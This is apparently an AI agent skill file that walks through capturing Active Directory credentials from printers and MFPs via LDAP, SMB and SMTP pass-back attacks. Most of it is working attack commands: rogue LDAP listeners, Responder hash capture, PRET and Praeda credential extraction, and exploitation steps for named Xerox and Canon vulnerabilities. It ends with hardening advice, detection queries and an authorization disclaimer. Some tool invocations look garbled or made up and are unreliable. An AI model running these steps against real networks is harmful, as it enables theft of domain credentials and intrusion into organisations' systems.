---
name: printer-ldap-credential-harvesting
description: How to harvest Active Directory credentials from printers configured with LDAP authentication. Use this skill whenever you're doing AD penetration testing, security assessments, or need to test printer security. Trigger this when the user mentions printers, MFPs, LDAP credential capture, pass-back attacks, or wants to test if printers will leak AD credentials to a rogue LDAP server. Also use when investigating printer-based attack vectors, CVE-2024-12510/12511, or Canon/Xerox printer vulnerabilities.
---

# Printer LDAP Credential Harvesting

This skill helps you capture Active Directory credentials from printers and MFPs (Multi-Function Printers) that are configured with LDAP authentication. Many printers will send credentials in clear-text when they attempt to bind to an LDAP server.

## When to Use This Skill

- You're conducting an AD penetration test and want to test printer security
- You need to verify if printers will leak credentials to a rogue LDAP server
- You're investigating CVE-2024-12510, CVE-2024-12511, or similar pass-back vulnerabilities
- You want to enumerate printer configurations and stored credentials
- You're doing a security assessment of printer infrastructure

## Attack Overview

Printers configured with LDAP for address book lookups or authentication often:
1. Store domain credentials in clear-text or weakly encrypted form
2. Send credentials in clear-text when binding to LDAP servers
3. Allow LDAP server configuration changes without re-entering credentials
4. Can be tricked into authenticating against attacker-controlled LDAP servers

## Quick Start

### 1. Set Up a Rogue LDAP Listener

Use one of these methods to capture credentials:

**Method A: Simple Netcat Listener** (works on older devices)
```bash
# Run from your attack machine
sudo nc -k -v -l -p 389
```

**Method B: Full LDAP Server with slapd** (recommended, more reliable)
```bash
# Install slapd
sudo apt install slapd ldap-utils

# Configure (any base-DN works, won't be validated)
sudo dpkg-reconfigure slapd

# Run in debug mode to see clear-text credentials
slapd -d 2 -h "ldap:///"
```

**Method C: Python Rogue LDAP** (lightweight alternative)
```bash
# Using impacket
python -m impacket.examples.ldapd -debug
```

### 2. Trigger the Printer to Connect

You have several options to force the printer to authenticate against your rogue LDAP server:

**Option A: Modify Printer Configuration** (if you have web interface access)
1. Access the printer's web interface
2. Navigate to: Network → LDAP Setting → Setting Up LDAP
3. Change the LDAP server address to your attack machine's IP
4. Click "Test Connection" or "Address Book Sync"

**Option B: Use Automated Tools**
```bash
# PRET - Printer Exploitation Toolkit
python pret.py <printer-ip> pjl

# Praeda - Harvest configuration including LDAP creds
perl praeda.pl -t <printer-ip>
```

**Option C: SMB/FTP Pass-Back** (for scan-to-folder vulnerabilities)
```bash
# Set up rogue SMB server
impacket-smbserver share /tmp

# Or use Responder for NTLMv2 hash capture
responder -I <interface> -wrf
```

### 3. Capture and Analyze Credentials

When the printer connects, you'll see:
- **Clear-text username/password** in slapd debug output
- **NTLMv2 hashes** if using Responder
- **FTP credentials** if using scan-to-folder pass-back

Example slapd output:
```
slapd: connection from <printer-ip> port <port>
slapd: bind DN: CN=PrinterService,OU=ServiceAccounts,DC=domain,DC=local
slapd: password: ******** (visible in debug mode)
```

## Detailed Methods

### Method 1: Netcat Listener

Best for quick tests on older MFPs that send simple-bind in clear-text.

```bash
# LDAP (port 389)
sudo nc -k -v -l -p 389

# LDAPS (port 636) - less common on printers
sudo nc -k -v -l -p 636

# Alternative port (3269 - Global Catalog)
sudo nc -k -v -l -p 3269
```

**Limitations:**
- Modern devices often perform anonymous search first
- May not capture credentials if device uses SASL or other auth methods
- Results vary by device model and firmware

### Method 2: Full LDAP Server (Recommended)

Using slapd provides more reliable results because it handles the full LDAP protocol.

**Setup Script:**
```bash
#!/bin/bash
# save as setup-ldap-listener.sh

# Install dependencies
sudo apt update
sudo apt install -y slapd ldap-utils

# Configure slapd (non-interactive)
echo "slapd slapd/password1 password yourpassword" | debconf-set-selections
echo "slapd slapd/password2 password yourpassword" | debconf-set-selections
sudo dpkg-reconfigure -f noninteractive slapd

# Stop existing slapd
sudo systemctl stop slapd

# Run in foreground with debug output
slapd -d 2 -h "ldap:///" -f /etc/slapd.conf
```

**What to look for in output:**
- `bind DN:` - the service account username
- `password:` - the clear-text password (in debug mode)
- Connection attempts from printer IP addresses

### Method 3: Impacket LDAP Server

Lightweight Python-based alternative to slapd.

```bash
# Install impacket if needed
pip install impacket

# Run rogue LDAP server
python -m impacket.examples.ldapd -debug

# Or with specific options
python -m impacket.examples.ldapd -dc-ip <your-ip> -debug
```

### Method 4: Responder for NTLMv2

Capture NTLMv2 hashes instead of clear-text credentials.

```bash
# Install responder
pip install responder

# Run with LDAP and SMB
responder -I <interface> -wrf

# Or just LDAP
responder -I <interface> -l
```

## Automated Enumeration Tools

### PRET (Printer Exploitation Toolkit)

```bash
# Clone and setup
git clone https://github.com/foospidy/pret.git
cd pret

# Discover printers via SNMP
python pret.py <printer-ip> snmp

# Access file system via PJL
python pret.py <printer-ip> pjl

# Check for default credentials
python pret.py <printer-ip> default-creds
```

### Praeda

```bash
# Harvest configuration from printer
perl praeda.pl -t <printer-ip>

# With specific options
perl praeda.pl -t <printer-ip> -p 80 -o output/
```

**What Praeda extracts:**
- LDAP server configurations
- Stored credentials
- Address book entries
- Network settings
- User accounts

### Custom Enumeration Script

Create `enumerate-printers.py` for batch testing:

```python
#!/usr/bin/env python3
import socket
import sys

def check_ldap_port(ip, port=389):
    """Check if printer is listening on LDAP port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def check_web_interface(ip):
    """Check if printer web interface is accessible"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, 80))
        sock.close()
        return result == 0
    except:
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python enumerate-printers.py <ip> [ip2] [ip3]...")
        sys.exit(1)
    
    for ip in sys.argv[1:]:
        print(f"\nChecking {ip}:")
        print(f"  Web interface (80): {'Open' if check_web_interface(ip) else 'Closed'}")
        print(f"  LDAP (389): {'Open' if check_ldap_port(ip) else 'Closed'}")
        print(f"  LDAPS (636): {'Open' if check_ldap_port(ip, 636) else 'Closed'}")

if __name__ == "__main__":
    main()
```

## Known Vulnerabilities

### Xerox VersaLink CVE-2024-12510 & CVE-2024-12511

**Affected:** Firmware ≤ 57.69.91 on VersaLink C70xx MFPs

**CVE-2024-12510 (LDAP pass-back):**
- Change LDAP server address in web interface
- Trigger lookup to leak Windows credentials
- Works with default credentials or authenticated admin

**CVE-2024-12511 (SMB/FTP pass-back):**
- Same mechanism via scan-to-folder destinations
- Leaks NetNTLMv2 or FTP clear-text credentials

**Exploitation:**
```bash
# Simple listener is sufficient
sudo nc -k -v -l -p 389

# Or for SMB
impacket-smbserver share /tmp
```

### Canon imageRUNNER / imageCLASS (May 2025 Advisory)

**Affected:** Dozens of Laser & MFP product lines

**Vulnerability:** SMTP/LDAP pass-back weakness
- Admin access allows server configuration modification
- Retrieves stored LDAP or SMTP credentials
- Many organizations use privileged accounts for scan-to-mail

**Exploitation:**
```bash
# LDAP listener
slapd -d 2 -h "ldap:///"

# SMTP listener (for scan-to-mail)
# Use custom SMTP server or Responder
```

## Hardening Recommendations

After testing, recommend these mitigations:

1. **Patch firmware promptly** - Check vendor PSIRT bulletins
2. **Use least-privilege service accounts** - Never use Domain Admin for printer LDAP/SMB/SMTP
3. **Restrict management access** - Place printer interfaces in management VLAN or behind ACL/VPN
4. **Disable unused protocols** - FTP, Telnet, raw-9100, older SSL ciphers
5. **Enable audit logging** - Syslog LDAP/SMTP failures, correlate unexpected binds
6. **Monitor for clear-text LDAP binds** - Printers should only talk to DCs
7. **Use SNMPv3 or disable SNMP** - Community `public` often leaks configuration

## Detection Queries

### Splunk/SIEM Queries

```splunk
# Detect LDAP binds from printers
index=network sourcetype=ldap "bind DN" (printer OR mfp OR multifunction)

# Detect clear-text LDAP on unusual ports
index=network port=389 ("simple bind" OR "bind DN")

# Detect printer web interface access from unusual sources
index=web src_ip!=<trusted-network> uri="/ldap" OR uri="/network"
```

### Network Monitoring

```bash
# Monitor LDAP traffic with tcpdump
tcpdump -i <interface> port 389 -A -s 0

# Monitor for LDAP binds
tcpdump -i <interface> port 389 -A | grep -i "bind"
```

## References

- [Just a Printer - Grimhacker](https://grimhacker.com/2018/03/09/just-a-printer/)
- [Obtaining Domain Credentials from Printers - CEO S3C](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
- [Exploiting Multifunction Printers - Nick Vangilder](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [Rapid7 - Xerox VersaLink Pass-Back Vulnerabilities](https://www.rapid7.com)
- [Canon PSIRT - SMTP/LDAP Passback Advisory](https://www.canon.com/psirt)

## Safety & Legal

**Important:** Only use these techniques on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal.

This skill is intended for:
- Authorized penetration testing engagements
- Security assessments with proper scoping
- Educational purposes in controlled environments
- Red team exercises with appropriate authorization
